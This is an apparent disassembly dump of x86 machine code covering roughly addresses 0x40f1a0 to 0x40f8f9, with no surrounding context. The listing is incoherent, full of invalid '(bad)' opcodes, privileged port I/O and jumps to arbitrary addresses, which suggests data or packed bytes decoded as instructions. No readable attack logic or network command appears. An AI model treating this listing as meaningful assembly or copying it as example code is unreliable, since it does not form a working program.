  40f1a0:	inc    edx
  40f1a1:	inc    eax
  40f1a2:	rcr    DWORD PTR [edi-0x5b],0x9f
  40f1a6:	shl    BYTE PTR [esi+ebp*1-0x78e14af7],0x93
  40f1ae:	pushf  
  40f1af:	mov    ah,0xfc
  40f1b1:	sub    al,0x2b
  40f1b3:	sti    
  40f1b4:	xor    edx,ecx
  40f1b6:	loopne 0x40f15e
  40f1b8:	mov    edi,0xfabea16c
  40f1bd:	sbb    al,BYTE PTR [ebx+0x63]
  40f1c0:	pusha  
  40f1c1:	xchg   ebp,eax
  40f1c2:	inc    ebx
  40f1c3:	arpl   WORD PTR [ecx],ax
  40f1c5:	mov    ebp,DWORD PTR [ebx-0x5a]
  40f1c8:	scas   al,BYTE PTR es:[edi]
  40f1c9:	ss inc ebx
  40f1cb:	repnz and esp,ebp
  40f1ce:	mov    edx,0xf022ebcd
  40f1d3:	retf   0xf391
  40f1d6:	inc    ebp
  40f1d7:	jbe    0x40f16c
  40f1d9:	cmp    eax,0x3726c63e
  40f1de:	ret    0xb0c5
  40f1e1:	mov    edi,0xe69d3bbf
  40f1e6:	mov    edi,0x6bba4282
  40f1eb:	jno    0x40f188
  40f1ed:	mov    ebx,0x68ad0e00
  40f1f2:	lea    ecx,[ebp+0x4d]
  40f1f5:	lea    esp,[eax-0x26]
  40f1f8:	(bad)  
  40f1f9:	mov    esp,0x8defcdc8
  40f1fe:	js     0x40f25a
  40f200:	loopne 0x40f1f9
  40f202:	lea    ebp,[eax-0x1]
  40f205:	into   
  40f206:	aam    0x72
  40f208:	jae    0x40f227
  40f20a:	mov    edx,0xcb152e49
  40f20f:	test   al,0x3e
  40f211:	xor    BYTE PTR [ebx+0x5b30fa24],bl
  40f217:	scas   eax,DWORD PTR es:[edi]
  40f218:	push   0xfcf501ee
  40f21d:	add    cl,dl
  40f21f:	mov    ah,BYTE PTR [edi+0x33]
  40f222:	mov    BYTE PTR [edi+0x42],bl
  40f225:	xor    BYTE PTR [esi],ah
  40f227:	fs iret 
  40f229:	push   ecx
  40f22a:	inc    edi
  40f22b:	or     ecx,DWORD PTR [ebp-0x60]
  40f22e:	mov    fs,WORD PTR [ebp-0x68]
  40f231:	(bad)  
  40f232:	or     ch,bl
  40f234:	sbb    bl,ah
  40f236:	or     eax,0x500f20c3
  40f23b:	xor    DWORD PTR [ebx+0x5c],edi
  40f23e:	arpl   WORD PTR [edx+esi*8-0x7],sp
  40f242:	xchg   edi,edx
  40f244:	push   0xffffffe4
  40f246:	(bad)  
  40f248:	or     DWORD PTR [ebx-0x38],0x16
  40f24c:	neg    esp
  40f24e:	loope  0x40f213
  40f250:	or     DWORD PTR [edi-0x58],ebx
  40f253:	popf   
  40f254:	rol    al,1
  40f256:	ret    0xf235
  40f259:	pop    edx
  40f25a:	shr    dl,cl
  40f25c:	(bad)  
  40f25d:	ffree  st(1)
  40f25f:	add    eax,0x74fd6f77
  40f264:	and    BYTE PTR [eax-0x2d],ch
  40f267:	addr16 hlt 
  40f269:	mov    cl,0x87
  40f26b:	shl    DWORD PTR [ecx+0x78],cl
  40f26e:	les    ecx,FWORD PTR [eax-0x72]
  40f271:	mov    cl,0x25
  40f273:	cwde   
  40f274:	in     eax,0x6d
  40f276:	mov    edi,0x9ffce02d
  40f27b:	shl    DWORD PTR [edi-0x69d10227],cl
  40f281:	xor    al,0x2a
  40f283:	mov    esi,esi
  40f285:	dec    ecx
  40f286:	fwait
  40f287:	add    eax,DWORD PTR [edx+0x21]
  40f28a:	mov    ds:0x295b3eae,eax
  40f28f:	aad    0x1c
  40f291:	push   ss
  40f292:	in     al,0xbb
  40f294:	loopne 0x40f2bb
  40f296:	jne    0x40f2ba
  40f298:	xchg   BYTE PTR [eax+0x1cc976d9],ah
  40f29e:	adc    edx,DWORD PTR [eax]
  40f2a0:	or     al,0xcb
  40f2a2:	sub    al,BYTE PTR [edx]
  40f2a4:	push   es
  40f2a5:	cmp    al,0xf
  40f2a7:	popa   
  40f2a8:	aas    
  40f2a9:	cwde   
  40f2aa:	loopne 0x40f2dd
  40f2ac:	pop    esp
  40f2ad:	sbb    eax,0x1b24226d
  40f2b2:	outs   dx,DWORD PTR ds:[esi]
  40f2b3:	call   0x5816f9a7
  40f2b8:	inc    ebx
  40f2b9:	lock fs je 0x40f2b5
  40f2bd:	fistp  WORD PTR [esi]
  40f2bf:	xlat   BYTE PTR ds:[ebx]
  40f2c0:	sub    eax,0xcf4f8dbe
  40f2c5:	xchg   ebp,eax
  40f2c6:	enter  0xa973,0x79
  40f2ca:	retf   0x95d9
  40f2cd:	inc    ebp
  40f2ce:	and    edi,DWORD PTR [esi-0x12]
  40f2d1:	jbe    0x40f324
  40f2d3:	inc    edi
  40f2d4:	aam    0xfc
  40f2d6:	cmp    bh,cl
  40f2d8:	mov    BYTE PTR [edx],0x1
  40f2db:	mov    ah,0x88
  40f2dd:	fs fs aas 
  40f2e0:	mov    dl,0x4e
  40f2e2:	test   BYTE PTR [ecx-0x7d],bl
  40f2e5:	jle    0x40f2aa
  40f2e7:	or     DWORD PTR [edi+0x45184422],eax
  40f2ed:	hlt    
  40f2ee:	push   esp
  40f2ef:	cmp    ebp,esp
  40f2f1:	push   esp
  40f2f2:	sbb    ecx,ecx
  40f2f4:	fdiv   st,st(0)
  40f2f6:	icebp  
  40f2f7:	outs   dx,BYTE PTR ds:[esi]
  40f2f8:	out    dx,eax
  40f2f9:	nop
  40f2fa:	jno    0x40f28c
  40f2fc:	imul   esp,esp,0xffffffed
  40f2ff:	inc    edi
  40f300:	les    eax,FWORD PTR [ebx-0x6]
  40f303:	sub    DWORD PTR [edi],eax
  40f305:	adc    al,0xd5
  40f307:	xlat   BYTE PTR ds:[ebx]
  40f308:	push   eax
  40f309:	sti    
  40f30a:	fwait
  40f30b:	pop    ss
  40f30c:	scas   al,BYTE PTR es:[edi]
  40f30d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f30e:	mov    ecx,0x3db13b03
  40f313:	aam    0xe2
  40f315:	jp     0x40f319
  40f317:	shl    BYTE PTR [eax],1
  40f319:	push   ecx
  40f31a:	and    DWORD PTR ds:0xcab8b50,edi
  40f320:	jmp    0x40f380
  40f322:	stos   BYTE PTR es:[edi],al
  40f323:	(bad)  
  40f324:	ficomp DWORD PTR [ebp+0x5550d30c]
  40f32a:	sbb    eax,0xd325f77d
  40f32f:	sub    al,0x92
  40f331:	daa    
  40f332:	mov    eax,0xb4380899
  40f337:	adc    ecx,DWORD PTR [esi-0x3207517e]
  40f33d:	xchg   edi,eax
  40f33e:	xchg   esi,eax
  40f33f:	pop    eax
  40f340:	loop   0x40f31e
  40f342:	(bad)  
  40f343:	pop    ss
  40f344:	fst    st(1)
  40f346:	push   es
  40f347:	mov    ds:0x6c093d43,al
  40f34c:	dec    edx
  40f34d:	inc    ebp
  40f34e:	mov    ds:0xf860be7e,al
  40f353:	xor    eax,DWORD PTR [eax]
  40f355:	push   0xdefabf3f
  40f35a:	xor    BYTE PTR [ebx+0x39bda4c7],0xc0
  40f361:	test   dl,al
  40f363:	inc    esi
  40f364:	mov    ss,edx
  40f366:	inc    eax
  40f367:	lods   al,BYTE PTR ds:[esi]
  40f368:	fld    QWORD PTR [ebp+0x3b6f9fce]
  40f36e:	and    ebp,ebx
  40f370:	and    ebx,DWORD PTR [esi+eiz*1-0x14]
  40f374:	(bad)  
  40f375:	iret   
  40f376:	sbb    al,ah
  40f378:	data16 (bad) 
  40f37a:	std    
  40f37b:	lods   al,BYTE PTR ds:[esi]
  40f37c:	xchg   edi,eax
  40f37d:	mov    ds:0x11151272,al
  40f382:	dec    esi
  40f383:	inc    edx
  40f384:	mov    al,ds:0xbaf5ea98
  40f389:	mov    eax,ds:0xcdd2d4ef
  40f38e:	and    dh,BYTE PTR [ecx]
  40f390:	cmp    eax,0xad2460b5
  40f395:	xor    BYTE PTR [edx],al
  40f397:	pop    DWORD PTR [edx+eax*8+0x49]
  40f39b:	mov    ecx,0x94e9361e
  40f3a0:	imul   ebp,DWORD PTR [ebx+0x35],0x76cd944c
  40f3a7:	out    0x69,al
  40f3a9:	lods   al,BYTE PTR ds:[esi]
  40f3aa:	test   eax,0x61c0babc
  40f3af:	add    al,0x16
  40f3b1:	lock push esi
  40f3b3:	inc    ebx
  40f3b4:	out    0xdc,eax
  40f3b6:	cld    
  40f3b7:	bound  ebp,QWORD PTR es:[esi]
  40f3ba:	sbb    edx,esi
  40f3bc:	xchg   esi,eax
  40f3bd:	jne    0x40f39e
  40f3bf:	and    ebp,ebx
  40f3c1:	or     BYTE PTR [edx-0x6e],al
  40f3c4:	inc    esi
  40f3c5:	pop    ds
  40f3c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3c7:	(bad)  
  40f3c8:	fsubr  QWORD PTR [edi-0x76]
  40f3cb:	fsubr  DWORD PTR [edx+ecx*1]
  40f3ce:	pushf  
  40f3cf:	es (bad) 
  40f3d1:	fadd   QWORD PTR [eax-0x2c885ad5]
  40f3d7:	adc    BYTE PTR [edx+0x68],cl
  40f3da:	xchg   ebx,eax
  40f3db:	mov    edi,0x2a589c2d
  40f3e0:	pop    eax
  40f3e1:	mov    ecx,0x1bd30eab
  40f3e6:	pop    ds
  40f3e7:	mov    dh,0x1a
  40f3e9:	pop    edx
  40f3ea:	jo     0x40f3dd
  40f3ec:	inc    ebx
  40f3ed:	adc    DWORD PTR ds:0x61468ba2,eax
  40f3f3:	call   DWORD PTR ds:0xd10
  40f3f8:	fmul   st(5),st
  40f3fa:	mov    ds:0x5678df91,al
  40f3ff:	in     al,dx
  40f400:	loope  0x40f44b
  40f402:	inc    ecx
  40f403:	test   DWORD PTR [edx],0xecb14511
  40f409:	push   edx
  40f40a:	mov    cl,0xd8
  40f40c:	lea    esi,[ebx-0x2d85049a]
  40f412:	(bad)  
  40f413:	into   
  40f414:	cmp    edi,DWORD PTR [eax+0x2f]
  40f417:	(bad)
  40f41b:	aaa    
  40f41c:	ja     0x40f412
  40f41e:	add    BYTE PTR [eiz*4+0x620263a1],dl
  40f425:	pop    ds
  40f426:	ret    0xd443
  40f429:	fimul  WORD PTR [edx]
  40f42b:	sbb    BYTE PTR [edx+0x62d37885],bl
  40f431:	mov    bl,0x0
  40f433:	push   DWORD PTR [eax+0x2e]
  40f436:	js     0x40f458
  40f438:	jmp    0x40f40d
  40f43a:	or     ebx,DWORD PTR [edx+0x253a5950]
  40f440:	or     al,0x4
  40f442:	fcmove st,st(4)
  40f444:	push   es
  40f445:	cmp    eax,0x478188a5
  40f44a:	ins    DWORD PTR es:[edi],dx
  40f44b:	pusha  
  40f44c:	lods   al,BYTE PTR ds:[esi]
  40f44d:	inc    eax
  40f44e:	jecxz  0x40f3d0
  40f450:	stos   BYTE PTR es:[edi],al
  40f451:	sbb    BYTE PTR [ecx],dl
  40f453:	in     al,dx
  40f454:	dec    eax
  40f455:	fs retf 0xd2ed
  40f459:	bound  edi,QWORD PTR [ebx+ebx*1]
  40f45c:	int    0x4a
  40f45e:	ins    BYTE PTR es:[edi],dx
  40f45f:	pop    ebp
  40f460:	xor    al,0x8e
  40f462:	retf   
  40f463:	jmp    0x8765:0x5322f535
  40f46a:	or     BYTE PTR [eax],ah
  40f46c:	xchg   ecx,eax
  40f46d:	sub    al,0xab
  40f46f:	pop    ds
  40f470:	mov    ch,bl
  40f472:	in     eax,dx
  40f473:	mov    edx,0x96d76b12
  40f478:	xchg   esi,eax
  40f479:	pop    ebx
  40f47a:	mov    BYTE PTR [ebx-0x1186f04b],cl
  40f480:	mov    edi,0x4e75cc9a
  40f485:	inc    esp
  40f486:	loope  0x40f4fb
  40f488:	test   al,0x8f
  40f48a:	(bad)  
  40f48c:	pop    ds
  40f48d:	icebp  
  40f48e:	gs mov dh,0x47
  40f491:	ss pop ds
  40f493:	sub    al,0x47
  40f495:	cmp    esp,DWORD PTR [edi+0x3d944325]
  40f49b:	fnsave [ebx+0x4d]
  40f49e:	fimul  DWORD PTR [eax-0x5f55ce5d]
  40f4a4:	lea    edx,[ecx-0x2e574c4c]
  40f4aa:	push   esi
  40f4ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4ac:	or     al,0x5e
  40f4ae:	int    0xef
  40f4b0:	dec    edi
  40f4b1:	mov    eax,0x91622806
  40f4b6:	add    al,0xf
  40f4b8:	popa   
  40f4b9:	or     ebp,DWORD PTR ds:0x8c6b76b6
  40f4bf:	or     esi,esi
  40f4c1:	pusha  
  40f4c2:	call   0x8349bd12
  40f4c7:	pop    ebx
  40f4c8:	mov    ebp,0x3d38d5c7
  40f4cd:	daa    
  40f4ce:	pop    eax
  40f4cf:	in     eax,0x48
  40f4d1:	ret    
  40f4d2:	or     DWORD PTR [esi-0x230fc349],eax
  40f4d8:	jb     0x40f45f
  40f4da:	std    
  40f4db:	xchg   esi,eax
  40f4dc:	jg     0x40f491
  40f4de:	jnp    0x40f478
  40f4e0:	ins    DWORD PTR es:[edi],dx
  40f4e1:	jno    0x40f46c
  40f4e3:	das    
  40f4e4:	add    BYTE PTR [edi+0x1ac54645],bl
  40f4ea:	lahf   
  40f4eb:	xchg   esp,eax
  40f4ec:	sahf   
  40f4ed:	stc    
  40f4ee:	popa   
  40f4ef:	jns    0x40f491
  40f4f1:	mov    edx,0x2f6b4376
  40f4f6:	xchg   ebp,eax
  40f4f7:	jne    0x40f55a
  40f4f9:	pop    eax
  40f4fa:	bound  eax,QWORD PTR [ecx+0x23]
  40f4fd:	and    BYTE PTR [esi-0x38b7d6f9],dl
  40f503:	mov    esi,0xe714b8a5
  40f508:	add    DWORD PTR [edx+0x59],0x1dd84f90
  40f50f:	xchg   ecx,eax
  40f510:	fidivr DWORD PTR [edx+esi*8-0x29f5dd62]
  40f517:	mov    BYTE PTR [ecx-0x93b6f27],ch
  40f51d:	fld    TBYTE PTR [ecx]
  40f51f:	pop    ebx
  40f520:	inc    esi
  40f521:	arpl   WORD PTR [ebp*8-0x4a6befbf],ax
  40f528:	mov    ds:0x3096cbb6,eax
  40f52d:	in     eax,0x55
  40f52f:	hlt    
  40f530:	test   DWORD PTR [bx-0x5c20],ebp
  40f535:	cmp    ebx,DWORD PTR [ecx-0x56]
  40f538:	inc    DWORD PTR [ecx+eiz*8-0x24]
  40f53c:	clc    
  40f53d:	stos   DWORD PTR es:[edi],eax
  40f53e:	test   BYTE PTR [ebp-0x5b],cl
  40f541:	pop    ss
  40f542:	jge    0x40f576
  40f544:	repnz inc edx
  40f546:	xor    DWORD PTR [ecx-0x60],ebp
  40f549:	mov    ds:0x3442a49c,eax
  40f54e:	adc    bh,BYTE PTR [edi+0x74]
  40f551:	sub    BYTE PTR [edx],al
  40f553:	mov    BYTE PTR [edx+0x5b],ch
  40f556:	mov    cl,0x32
  40f558:	cmc    
  40f559:	fldenv [ecx]
  40f55b:	test   eax,0x838cde4a
  40f560:	cmp    esi,DWORD PTR [edi]
  40f562:	int3   
  40f563:	xor    DWORD PTR [ebp+0x44bb4eb2],ecx
  40f569:	fild   QWORD PTR [ebp+0x4781a9ac]
  40f56f:	(bad)  
  40f571:	sub    al,0xfa
  40f573:	leave  
  40f574:	icebp  
  40f575:	adc    DWORD PTR [ecx-0x5fb3548f],0x40
  40f57c:	sahf   
  40f57d:	mov    eax,0x70addc43
  40f582:	cwde   
  40f583:	dec    ebp
  40f584:	push   edi
  40f585:	fstp   TBYTE PTR [ecx]
  40f587:	fadd   st(7),st
  40f589:	push   ecx
  40f58a:	mov    bh,0x50
  40f58c:	daa    
  40f58d:	inc    ebp
  40f58e:	sub    DWORD PTR [ecx],edx
  40f590:	xchg   esp,eax
  40f591:	xor    eax,0xc5d1ad6
  40f596:	pop    es
  40f597:	mov    eax,ds:0x212c57b9
  40f59c:	and    ecx,esp
  40f59e:	fst    QWORD PTR [edi+0x5f4979c2]
  40f5a4:	mov    esi,0x1de04a23
  40f5a9:	jo     0x40f5a2
  40f5ab:	(bad)  
  40f5ad:	ret    
  40f5ae:	adc    al,0xa4
  40f5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b1:	mov    edx,esp
  40f5b3:	rol    BYTE PTR [ebx+0x2e],1
  40f5b6:	add    eax,0x65949d86
  40f5bb:	popf   
  40f5bc:	in     al,0xd5
  40f5be:	push   esp
  40f5bf:	add    BYTE PTR ds:0x761d0749,ch
  40f5c5:	pop    esp
  40f5c6:	dec    edx
  40f5c7:	jmp    0x6feaee15
  40f5cc:	add    DWORD PTR cs:[edx],0xfffffffa
  40f5d0:	ror    BYTE PTR [ebx+0x4f279a9b],cl
  40f5d6:	xor    eax,DWORD PTR [edx-0x5e]
  40f5d9:	pop    edx
  40f5da:	mov    ah,0x15
  40f5dc:	and    eax,0x26db966a
  40f5e1:	xor    dh,bh
  40f5e3:	mov    WORD PTR [esi+0x4451a204],?
  40f5e9:	call   0xc5db:0x200608ef
  40f5f0:	pop    es
  40f5f1:	inc    ecx
  40f5f2:	test   BYTE PTR [edi+ebp*2+0x67],0xe8
  40f5f7:	mov    al,0x2c
  40f5f9:	test   BYTE PTR [edx],0x5d
  40f5fc:	sub    al,BYTE PTR [ecx-0x269266ea]
  40f602:	xchg   BYTE PTR [edx],ah
  40f604:	pop    esp
  40f605:	mov    al,0xa1
  40f607:	nop
  40f608:	pop    edi
  40f609:	leave  
  40f60a:	pop    eax
  40f60b:	ret    
  40f60c:	rcr    DWORD PTR [ebp+0x25],0x42
  40f610:	fnstcw WORD PTR [eax]
  40f612:	ds xor eax,0x1b7c8e43
  40f618:	jnp    0x40f696
  40f61a:	jnp    0x40f63c
  40f61c:	adc    DWORD PTR [ecx+0x55ea5a22],eax
  40f622:	push   edi
  40f623:	and    eax,edi
  40f625:	retf   0x6b6b
  40f628:	gs fld st(6)
  40f62b:	mov    cl,ah
  40f62d:	ficomp DWORD PTR [edx*1+0x7ccc9d6e]
  40f634:	(bad)  
  40f635:	sub    ecx,DWORD PTR ds:0x47c0951d
  40f63b:	adc    DWORD PTR [eax+ebx*8+0x7d],esp
  40f63f:	clc    
  40f640:	lods   al,BYTE PTR ds:[esi]
  40f641:	popf   
  40f642:	call   0x5bee:0x9a65e4bd
  40f649:	inc    ebp
  40f64a:	mov    al,0x53
  40f64c:	data16 hlt 
  40f64e:	and    al,0x58
  40f650:	outs   dx,DWORD PTR ds:[esi]
  40f651:	xchg   DWORD PTR [eax],edi
  40f653:	xchg   esi,eax
  40f654:	xchg   ecx,eax
  40f655:	xlat   BYTE PTR ds:[ebx]
  40f656:	or     al,0xe
  40f658:	jge    0x40f6b3
  40f65a:	lahf   
  40f65b:	push   edi
  40f65c:	fidivr DWORD PTR [edi-0x39]
  40f65f:	int3   
  40f660:	push   ebp
  40f661:	xchg   ebx,eax
  40f662:	stc    
  40f663:	pop    edi
  40f664:	test   BYTE PTR [ebx],dl
  40f666:	and    DWORD PTR [edi-0x57f1fd91],esi
  40f66c:	xchg   ecx,eax
  40f66d:	pop    ebx
  40f66e:	xchg   edi,eax
  40f66f:	or     BYTE PTR [esi-0x4d],al
  40f672:	div    DWORD PTR [edx]
  40f674:	fdivr  QWORD PTR [edx-0x2]
  40f677:	xor    al,0x47
  40f679:	(bad)  
  40f67a:	cdq    
  40f67b:	rol    ch,1
  40f67d:	scas   eax,DWORD PTR es:[edi]
  40f67e:	xor    eax,0xba476f16
  40f683:	push   ebx
  40f684:	stos   DWORD PTR es:[edi],eax
  40f685:	and    edi,DWORD PTR [eax]
  40f687:	inc    edi
  40f688:	loop   0x40f6dc
  40f68a:	dec    ebx
  40f68b:	dec    ecx
  40f68c:	xchg   edx,eax
  40f68d:	jnp    0x40f688
  40f68f:	cmp    BYTE PTR ds:0x8ee2a3dd,dl
  40f695:	pop    ebp
  40f696:	pushf  
  40f697:	std    
  40f698:	cmp    eax,0x605365d6
  40f69d:	push   ecx
  40f69e:	xor    dl,cl
  40f6a0:	in     eax,0xa9
  40f6a2:	sub    cl,BYTE PTR ds:0xc415816a
  40f6a8:	fist   WORD PTR [ebx+0x282fa112]
  40f6ae:	std    
  40f6af:	jbe    0x40f70a
  40f6b1:	es cmp al,0x9
  40f6b4:	sbb    bl,ch
  40f6b6:	arpl   cx,cx
  40f6b8:	push   ecx
  40f6b9:	bnd jne 0x40f6e1
  40f6bc:	dec    edx
  40f6bd:	ror    BYTE PTR [edx-0x58],cl
  40f6c0:	das    
  40f6c1:	fs test cl,dl
  40f6c4:	push   ds
  40f6c5:	mov    WORD PTR [edx],ss
  40f6c7:	std    
  40f6c8:	and    DWORD PTR [edx-0x12],0x57
  40f6cc:	cli    
  40f6cd:	push   es
  40f6ce:	cmp    al,0x61
  40f6d0:	xchg   edx,eax
  40f6d1:	mov    esp,0x1c0b1198
  40f6d6:	xchg   ebp,eax
  40f6d7:	cs xor eax,ebp
  40f6da:	jne    0x40f6c1
  40f6dc:	xor    ecx,DWORD PTR [edx-0x73]
  40f6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6e0:	xchg   dl,dh
  40f6e2:	into   
  40f6e3:	jne    0x40f6a8
  40f6e5:	or     DWORD PTR [esi-0x5cefcfb6],esp
  40f6eb:	les    edx,FWORD PTR es:[esi]
  40f6ee:	and    cl,ah
  40f6f0:	loopne 0x40f6b5
  40f6f2:	cmp    edx,DWORD PTR [ebx+0x254d8994]
  40f6f8:	fadd   QWORD PTR [ebp-0x7d]
  40f6fb:	addr16 mov ds:0xedd2,eax
  40f6ff:	pop    edx
  40f700:	mov    ch,0x7d
  40f702:	(bad)  
  40f703:	pop    edx
  40f704:	ret    
  40f705:	xchg   DWORD PTR [ecx+eiz*1],edi
  40f708:	icebp  
  40f709:	pop    ecx
  40f70a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f70b:	or     BYTE PTR [esi-0x3b7b264a],ah
  40f711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f712:	(bad)  
  40f713:	sub    al,0x9b
  40f715:	xchg   esp,eax
  40f716:	int    0x92
  40f718:	ds pop ebx
  40f71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71b:	adc    esp,DWORD PTR [eax-0x21]
  40f71e:	mov    ebp,0x21c66e75
  40f723:	(bad)
  40f727:	add    al,0x39
  40f729:	push   eax
  40f72a:	adc    bl,BYTE PTR [eax]
  40f72c:	cld    
  40f72d:	cmp    eax,0x77
  40f730:	xlat   BYTE PTR ds:[ebx]
  40f731:	lahf   
  40f732:	aad    0xa7
  40f734:	sub    al,0xfb
  40f736:	fidivr WORD PTR [edi]
  40f738:	fadd   DWORD PTR [esi+0x2e]
  40f73b:	push   ebp
  40f73c:	push   ds
  40f73d:	xchg   edx,eax
  40f73e:	and    eax,0x267fb07a
  40f743:	pop    ds
  40f744:	shl    BYTE PTR cs:[esi+0x22],cl
  40f748:	fs cmp ebx,ebx
  40f74b:	xor    esi,DWORD PTR [edx+0x79616d21]
  40f751:	daa    
  40f752:	xchg   esi,eax
  40f753:	bound  esp,QWORD PTR [esi]
  40f755:	scas   eax,DWORD PTR es:[edi]
  40f756:	ret    0x610f
  40f759:	mul    DWORD PTR [ebp-0x7c]
  40f75c:	rol    BYTE PTR [esi-0x2617ebe1],1
  40f762:	jle    0x40f756
  40f764:	mov    ah,0xa4
  40f766:	mov    dh,0x26
  40f768:	mov    bh,0x4c
  40f76a:	lahf   
  40f76b:	loop   0x40f7b2
  40f76d:	xor    cl,bh
  40f76f:	lea    ebx,[edi]
  40f771:	mov    al,0xfb
  40f773:	xor    edx,DWORD PTR [eax]
  40f775:	pop    ecx
  40f776:	cmp    al,0x37
  40f778:	loope  0x40f737
  40f77a:	mov    ah,0xa
  40f77c:	cmc    
  40f77d:	div    sp
  40f780:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f782:	pushf  
  40f783:	outs   dx,DWORD PTR ds:[esi]
  40f784:	push   es
  40f785:	sbb    DWORD PTR [edx-0x1040c11e],ecx
  40f78b:	ds push esi
  40f78d:	in     al,dx
  40f78e:	(bad)  
  40f78f:	jp     0x40f7dd
  40f791:	stos   DWORD PTR es:[edi],eax
  40f792:	sub    al,0x15
  40f794:	rcr    BYTE PTR [ebp+0x48a4fde9],0xa4
  40f79b:	(bad)  
  40f79c:	xchg   ecx,eax
  40f79d:	ret    
  40f79e:	addr16 cmp ebp,eax
  40f7a1:	add    DWORD PTR [edx],ecx
  40f7a3:	call   0x6cbced38
  40f7a8:	and    esp,esi
  40f7aa:	inc    edx
  40f7ab:	int    0x59
  40f7ad:	out    dx,al
  40f7ae:	adc    eax,0x5420628f
  40f7b3:	add    al,0x58
  40f7b5:	int    0x7f
  40f7b7:	int3   
  40f7b8:	cmp    bl,al
  40f7ba:	sti    
  40f7bb:	adc    ebp,DWORD PTR gs:[ecx-0x48]
  40f7bf:	pop    ss
  40f7c0:	jl     0x40f809
  40f7c2:	nop
  40f7c3:	adc    ah,BYTE PTR [ebx+0x39]
  40f7c6:	repz cli 
  40f7c8:	lods   eax,DWORD PTR ds:[esi]
  40f7c9:	jae    0x40f765
  40f7cb:	js     0x40f76a
  40f7cd:	sub    edi,ebx
  40f7cf:	(bad)  
  40f7d1:	loope  0x40f7da
  40f7d3:	fucomip st,st(0)
  40f7d5:	(bad)  
  40f7d6:	mov    dh,0xac
  40f7d8:	add    al,0xf9
  40f7da:	mov    edi,0x5cad4464
  40f7df:	enter  0x4567,0x89
  40f7e3:	outs   dx,BYTE PTR ds:[esi]
  40f7e4:	xor    al,0x20
  40f7e6:	mov    esi,0x6f1f13a8
  40f7eb:	inc    edi
  40f7ec:	dec    edx
  40f7ed:	adc    cl,dl
  40f7ef:	inc    edi
  40f7f0:	and    BYTE PTR [edx+0x4],bl
  40f7f3:	add    al,0x84
  40f7f5:	pop    ds
  40f7f6:	adc    cl,BYTE PTR [edx+0x354930c9]
  40f7fc:	sahf   
  40f7fd:	jns    0x40f7e7
  40f7ff:	iret   
  40f800:	popa   
  40f801:	test   al,0xe7
  40f803:	(bad)
  40f807:	add    BYTE PTR [ecx+0x5c],bl
  40f80a:	(bad)  
  40f80c:	jg     0x40f7f0
  40f80e:	cmp    eax,0xa840fdfd
  40f813:	imul   ecx
  40f815:	aad    0xf4
  40f817:	or     BYTE PTR [esi+0x66],dh
  40f81a:	into   
  40f81b:	xchg   BYTE PTR [ebp-0x70],dl
  40f81e:	sbb    ch,al
  40f820:	and    DWORD PTR [ecx-0x23],ebp
  40f823:	mov    bh,BYTE PTR [edi]
  40f825:	sbb    eax,0x5ed32e03
  40f82a:	clc    
  40f82b:	adc    BYTE PTR [edi+0x1],ch
  40f82e:	ret    0x694d
  40f831:	jmp    FWORD PTR [ecx]
  40f833:	lds    esp,FWORD PTR [ecx-0x4fb45e09]
  40f839:	mov    ah,0x23
  40f83b:	test   BYTE PTR [ecx-0x243fd82b],dl
  40f841:	push   ebx
  40f842:	loop   0x40f868
  40f844:	(bad)  
  40f845:	test   DWORD PTR [ebp-0x1378bc9d],esi
  40f84b:	ficomp DWORD PTR [eax]
  40f84d:	mov    bl,0xd6
  40f84f:	test   eax,0xe80b1c61
  40f854:	lahf   
  40f855:	xor    BYTE PTR [ebx+0x3e492e09],dh
  40f85b:	xor    eax,0xd5bf664c
  40f860:	xchg   dh,bh
  40f862:	int3   
  40f863:	(bad)  
  40f864:	jge    0x40f844
  40f866:	lahf   
  40f867:	pushf  
  40f868:	push   cs
  40f869:	dec    eax
  40f86a:	add    eax,DWORD PTR [edi-0x4aa5bf0d]
  40f870:	ror    DWORD PTR [edi-0x249703d],0x83
  40f877:	lock call 0x1069f07e
  40f87d:	push   0xffffffd2
  40f87f:	mov    eax,0xba0ad6d9
  40f884:	out    0x17,al
  40f886:	mov    fs,WORD PTR [esi+0xc9747aa]
  40f88c:	div    BYTE PTR [esi+edx*1+0x62]
  40f890:	out    dx,al
  40f891:	mov    bl,0x9b
  40f893:	add    BYTE PTR [eax],bh
  40f895:	push   esp
  40f896:	ror    cl,cl
  40f898:	xchg   BYTE PTR [esi+ecx*4-0x6c],ch
  40f89c:	pop    ebp
  40f89d:	push   es
  40f89e:	enter  0x3b29,0xcc
  40f8a2:	idiv   DWORD PTR [edx+0x70]
  40f8a5:	cmc    
  40f8a6:	jo     0x40f833
  40f8a8:	ja     0x40f878
  40f8aa:	and    ebx,eax
  40f8ac:	cld    
  40f8ad:	cli    
  40f8ae:	sbb    ch,bl
  40f8b0:	inc    eax
  40f8b1:	ret    
  40f8b2:	add    cl,BYTE PTR [ebx+esi*8-0x48]
  40f8b6:	arpl   di,di
  40f8b8:	fnstsw WORD PTR [edx+eiz*2]
  40f8bb:	push   ecx
  40f8bc:	xor    esp,esp
  40f8be:	mov    eax,ds:0x54bdc1ee
  40f8c3:	mov    cl,0x65
  40f8c5:	mov    esp,0x760c6af2
  40f8ca:	and    DWORD PTR [ebx+esi*2+0x75d0d58b],ecx
  40f8d1:	leave  
  40f8d2:	xchg   ebp,eax
  40f8d3:	sbb    bl,BYTE PTR [edi]
  40f8d5:	aam    0x32
  40f8d7:	and    ah,bl
  40f8d9:	pop    ecx
  40f8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8db:	adc    bh,ch
  40f8dd:	xchg   ecx,eax
  40f8de:	into   
  40f8df:	or     al,0x8c
  40f8e1:	out    dx,eax
  40f8e2:	mov    esp,edi
  40f8e4:	scas   al,BYTE PTR es:[edi]
  40f8e5:	js     0x40f8db
  40f8e7:	jg     0x40f8ed
  40f8e9:	and    eax,0xa7221545
  40f8ee:	dec    edx
  40f8ef:	neg    dl
  40f8f1:	or     BYTE PTR [esi],0x2d
  40f8f4:	or     eax,0x651b9bae
  40f8f9:	push   edx
